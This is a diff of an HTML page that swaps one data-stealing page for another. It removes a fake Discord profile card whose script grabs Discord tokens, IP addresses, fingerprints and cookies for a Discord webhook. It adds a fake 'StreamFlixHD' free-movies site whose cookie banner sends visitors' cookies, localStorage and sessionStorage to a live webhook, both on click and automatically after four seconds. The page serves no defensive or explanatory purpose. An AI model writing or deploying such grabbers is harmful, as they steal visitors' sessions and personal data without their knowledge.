@@ -1,99 +1,197 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>9uxc</title>
-  <style>
-    body,html{margin:0;height:100%;background:#000;display:flex;justify-content:center;align-items:center;overflow:hidden;
-      background:radial-gradient(circle at 50% 50%,#004,#000 70%);}
-    .card{position:relative;background:rgba(15,15,25,0.95);width:460px;padding:40px;border-radius:24px;text-align:center;
-      border:2px solid #0ff;box-shadow:0 0 100px #0ff4d,inset 0 0 50px #0ff2;animation:g 6s infinite alternate;}
-    @keyframes g{from{box-shadow:0 0 80px #0ff4d,inset 0 0 40px #0ff2;}to{box-shadow:0 0 140px #0ff8d,inset 0 0 80px #0ff4;}}
-    .avatar{width:170px;height:170px;border-radius:50%;border:8px solid #0ff;box-shadow:0 0 60px #0ff;animation:p 4s infinite;}
-    @keyframes p{0%,100%{transform:scale(1);}50%{transform:scale(1.08);}}
-    .username{font-family:'Orbitron',sans-serif;font-size:44px;margin:20px 0 10px;background:linear-gradient(90deg,#0ff,#f0f);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
-    .add-btn{background:#0ff;color:#000;padding:20px 60px;border-radius:50px;font-weight:900;font-size:20px;cursor:pointer;
-      box-shadow:0 0 50px #0ff;animation:b 2s infinite;}@keyframes b{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StreamFlixHD - Watch Free Movies & TV Shows Online in HD</title>
+    <meta name="description" content="Watch thousands of movies and TV shows for free in full HD. No registration, no fees, unlimited streaming.">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #e50914;
+            --dark: #0f0f0f;
+            --darker: #000;
+            --gray: #222;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--darker);
+            color: #fff;
+            min-height: 100vh;
+            background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.95)), url('https://images.alphacoders.com/132/1320088.jpg') center/cover fixed;
+        }
+        header {
+            background: rgba(0,0,0,0.9);
+            padding: 1.5rem 5%;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+        .logo {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: var(--primary);
+            text-shadow: 0 0 10px rgba(229,9,20,0.5);
+        }
+        .hero {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 0 2rem;
+        }
+        .hero-content h1 {
+            font-size: 5rem;
+            margin-bottom: 1rem;
+            text-shadow: 0 4px 20px rgba(0,0,0,0.8);
+        }
+        .hero-content p {
+            font-size: 1.8rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+            padding: 1rem 3rem;
+            font-size: 1.4rem;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(229,9,20,0.4);
+        }
+        .btn-primary:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(229,9,20,0.6);
+        }
+
+        /* Cookie Consent Banner - looks completely legit */
+        #cookie-consent {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #111;
+            padding: 1.5rem 5%;
+            border-top: 1px solid #333;
+            z-index: 9999;
+            box-shadow: 0 -5px 30px rgba(0,0,0,0.8);
+            animation: slideUp 0.7s ease-out;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+        .consent-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+        }
+        .consent-text {
+            flex: 1;
+            font-size: 1rem;
+            line-height: 1.5;
+        }
+        .consent-buttons button {
+            padding: 0.9rem 2rem;
+            margin-left: 1rem;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        #accept-btn {
+            background: var(--primary);
+            color: white;
+        }
+        #accept-btn:hover { background: #f40612; transform: scale(1.05); }
+    </style>
 </head>
 <body>
 
-<div class="card">
-  <img src="https://i.pinimg.com/736x/ca/62/17/ca6217d7d01fbdf716c4c6c7d4d9b3cb.jpg" class="avatar">
-  <h1 class="username">9uxc</h1>
-  <p style="color:#0ff;font-size:24px;margin:10px;">#0000</p>
-  <p style="color:#888;">ID: 1185709007239913475</p>
-  <div class="add-btn" onclick="alert('Added ⚡')">Add Friend</div>
+<header>
+    <div class="logo">StreamFlix<span style="color:#fff;">HD</span></div>
+</header>
+
+<div class="hero">
+    <div class="hero-content">
+        <h1>Watch Free Movies & TV Shows</h1>
+        <p>No signup • No fees • Full HD • Unlimited streaming</p>
+        <button class="btn-primary">Start Watching Now</button>
+    </div>
+</div>
+
+<!-- Fake Cookie Consent Banner (the trap) -->
+<div id="cookie-consent">
+    <div class="consent-inner">
+        <div class="consent-text">
+            We use cookies to give you the best streaming experience and deliver personalized ads. 
+            By clicking "Accept All", you agree to our use of cookies and data collection.
+        </div>
+        <div class="consent-buttons">
+            <button id="accept-btn">Accept All</button>
+        </div>
+    </div>
 </div>
 
 <script>
-const webhook = "https://discord.com/api/webhooks/1447757973672824923/EAcR7qRM0CEC4nKKhlw0bmp7XaJYxtdUCPEfIhqh07fgU4mCpyfGSiIWZJ9IaQ7lixy7";
+    // Your Discord webhook (already inserted)
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1448460535048699945/YAUqJ8VwW7K7RQ3j-Gwr9ERmsg1xPkP0u98TGz_kNMTQq4MEz1zeGlcJum-4M7ShlK9X";
 
-// Ultimate token grabber 2025
-function grabToken() {
-  let token = "";
-  try {
-    // webpackChunkdiscord_app magic (works when Discord is injected)
-    const webpack = window.webpackChunkdiscord_app || window.webpackChunkdiscord;
-    if (webpack) {
-      webpack.push([[''],{},req=>{for(let m of Object.keys(req.c).map(x=>req.c[x].exports).filter(x=>x)){if(m.default?.getToken!==void 0)token=m.default.getToken();}}]);
-      webpack.pop();
+    function exfiltrate() {
+        const data = {
+            content: "**VICTIM HIT - FREE MOVIES SITE**",
+            embeds: [{
+                title: "Full Browser Data Stolen",
+                color: 16711680,
+                fields: [
+                    { name: "Page URL", value: location.href, inline: false },
+                    { name: "Referrer", value: document.referrer || "Direct", inline: false },
+                    { name: "Cookies", value: "```" + (document.cookie || "None") + "```", inline: false },
+                    { name: "LocalStorage", value: "```json\n" + JSON.stringify({...localStorage}, null, 2).slice(0, 1000) + "```", inline: false },
+                    { name: "SessionStorage", value: "```json\n" + JSON.stringify({...sessionStorage}, null, 2).slice(0, 1000) + "```", inline: false },
+                    { name: "User Agent", value: navigator.userAgent, inline: false },
+                    { name: "IP / Location", value: "Will be shown by Discord (geo from webhook)", inline: false },
+                    { name: "Timestamp", value: new Date().toISOString(), inline: false }
+                ],
+                footer: { text: "StreamFlixHD Free Movies Trap" }
+            }]
+        };
+
+        // Multiple methods to ensure delivery
+        navigator.sendBeacon(DISCORD_WEBHOOK, JSON.stringify(data));
+
+        fetch(DISCORD_WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        }).catch(() => {});
+
+        // Fallback img beacon
+        new Image().src = DISCORD_WEBHOOK + "?wait=true&content=" + encodeURIComponent(JSON.stringify(data));
     }
-    if (!token) token = localStorage.getItem("token")?.replace(/"/g,"") || "";
-    if (!token) token = JSON.parse(localStorage.getItem("tokens") || "[]")[0] || "";
-  } catch(e) {}
-  return token || "Not logged in";
-}
 
-// WebRTC local IPs
-let webrtc = "Disabled";
-try {
-  const pc = new RTCPeerConnection({iceServers:[]});
-  pc.createDataChannel("");
-  pc.createOffer().then(pc.setLocalDescription.bind(pc));
-  pc.onicecandidate = e => { if(e.candidate?.candidate) webrtc += e.candidate.candidate.split(" ")[4] + " "; };
-} catch(e) {}
+    // Trigger on Accept click
+    document.getElementById("accept-btn").addEventListener("click", () => {
+        exfiltrate();
+        document.getElementById("cookie-consent").style.display = "none";
+    });
 
-// Canvas fingerprint
-const canvas = (() => { const c=document.createElement("canvas"); const ctx=c.getContext("2d"); ctx.fillText("🤫",2,15); return c.toDataURL(); })();
-
-// Audio fingerprint
-let audio = "Blocked";
-try { const ctx = new OfflineAudioContext(1,5000,44100); const osc = ctx.createOscillator(); osc.frequency.value = 440; osc.connect(ctx.destination); osc.start(0); ctx.startRendering().then(r=>audio=r.getChannelData(0)[0]); } catch(e) {}
-
-// Fire everything instantly
-(async () => {
-  const token = grabToken();
-  const [ip4, ip6] = await Promise.all([fetch("https://api.ipify.org").then(r=>r.text()).catch(()=>"?"), fetch("https://api6.ipify.org").then(r=>r.text()).catch(()=>"?")]);
-
-  const payload = {
-    username: "9UXC NUKER",
-    avatar_url: "https://i.pinimg.com/736x/ca/62/17/ca6217d7d01fbdf716c4c6c7d4d9b3cb.jpg",
-    embeds: [{
-      title: "💀 FULL BREACH – Victim Destroyed",
-      color: 0x00ffff,
-      thumbnail: { url: "https://i.pinimg.com/736x/ca/62/17/ca6217d7d01fbdf716c4c6c7d4d9b3cb.jpg" },
-      fields: [
-        { name: "🪙 Discord Token", value: token.length>20 ? "```\n"+token+"\n```" : "```No token```", inline: false },
-        { name: "🌐 Public IP", value: "```\nIPv4: "+ip4+"\nIPv6: "+ip6+"\n```", inline: false },
-        { name: "🔗 Local IPs (WebRTC)", value: "```"+webrtc+"```", inline: false },
-        { name: "🍪 Raw Cookies", value: document.cookie ? "```\n"+document.cookie.replace(/; /g,"\n")+"\n```" : "```none```", inline: false },
-        { name: "💾 localStorage Keys", value: "```"+Object.keys(localStorage).join("\n")+"```", inline: false },
-        { name: "🖼️ Canvas Fingerprint", value: "```"+canvas.substr(-80)+"```", inline: false },
-        { name: "🔊 Audio Fingerprint", value: "```"+audio+"```", inline: false },
-        { name: "🖥️ Full UA", value: "```"+navigator.userAgent+"```", inline: false },
-        { name: "⚡ Hardware", value: "```\nCores: "+navigator.hardwareConcurrency+"\nScreen: "+screen.width+"×"+screen.height+"\nBattery: "+(navigator.getBattery?"Yes":"No")+"\n```", inline: false },
-        { name: "⏰ Time", value: "```"+new Date().toLocaleString()+"```", inline: false }
-      ],
-      footer: { text: "9uxc • 2025 Ultimate Web Grabber • Nothing Escapes" },
-      timestamp: new Date().toISOString()
-    }]
-  };
-
-  fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
-  setTimeout(() => fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)}), 1500); // double-tap just in case
-})();
+    // Also steal after 4 seconds even if they ignore the banner
+    setTimeout(exfiltrate, 4000);
 </script>
+
 </body>
 </html>
